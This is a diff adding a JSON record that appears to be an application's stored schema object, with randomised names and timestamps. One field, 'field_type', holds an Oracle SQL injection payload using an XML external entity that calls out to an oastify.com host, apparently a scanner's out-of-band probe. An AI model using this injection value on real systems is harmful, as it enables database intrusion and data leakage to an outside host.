@@ -1,0 +1,33 @@
+{
+	"createdTime":1741334490732,
+	"deleted":true,
+	"description":"SZHLUr",
+	"id":"67caa7da8780f31288255a50",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % kgwic SYSTEM \"http://yxz50c25y8dyqgnz9x2zkk6g87e021q4ew1ppe.oasti'||'fy.com/\">%kgwic;]>'),'/l') from dual)",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":22743,
+	"lcName":"qvfspo",
+	"modifiedTime":1741358658452,
+	"name":"QvfSPO",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":22743,
+	"standard":false,
+	"version":1
+}
